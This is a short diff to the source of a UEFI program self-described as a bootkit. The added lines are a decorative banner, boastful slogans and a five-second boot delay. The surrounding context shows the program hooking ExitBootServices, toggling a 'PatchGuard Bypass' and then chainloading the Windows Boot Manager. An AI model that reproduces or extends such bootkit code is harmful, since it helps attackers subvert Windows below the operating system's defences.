@@ -465,10 +465,19 @@ DioProcessEfiEntry(
     EFI_STATUS Status;
 
     Print(L"\r\n");
-    Print(L"===========================================\r\n");
-    Print(L"  DioProcess UEFI Bootkit v1.0\r\n");
-    Print(L"===========================================\r\n");
+    Print(L"   ____  _       ____                                   \r\n");
+    Print(L"  |  _ \\(_) ___ |  _ \\ _ __ ___   ___ ___  ___ ___     \r\n");
+    Print(L"  | | | | |/ _ \\| |_) | '__/ _ \\ / __/ _ \\/ __/ __|    \r\n");
+    Print(L"  | |_| | | (_) |  __/| | | (_) | (_|  __/\\__ \\__ \\    \r\n");
+    Print(L"  |____/|_|\\___/|_|   |_|  \\___/ \\___\\___||___/___/    \r\n");
     Print(L"\r\n");
+    Print(L"        D I O P R O C E S S   I S   G O D   P R O C E S S\r\n");
+    Print(L"\r\n");
+    Print(L"        Before Kernel. Before PatchGuard. Before You.\r\n");
+    Print(L"\r\n");
+    Print(L"        https://un4ckn0wl3z.dev/\r\n");
+    Print(L"\r\n");
+
 
     // Install ExitBootServices hook
     gOriginalExitBootServices = gBS->ExitBootServices;
@@ -483,7 +492,9 @@ DioProcessEfiEntry(
         Print(L"[*] PatchGuard Bypass: %s\r\n", Config.KppBypass ? L"ENABLED" : L"disabled");
     }
 
+    Print(L"[*] Booting in 5 seconds...\r\n");
     Print(L"\r\n");
+    gBS->Stall(5000000); // 5 seconds to flex
 
     // Chainload Windows Boot Manager
     Status = ChainloadWindowsBootManager(ImageHandle);
